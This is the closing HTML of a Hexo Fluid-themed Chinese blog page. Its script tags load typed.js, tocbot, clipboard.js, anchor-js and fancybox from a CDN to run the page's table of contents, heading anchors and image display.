<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
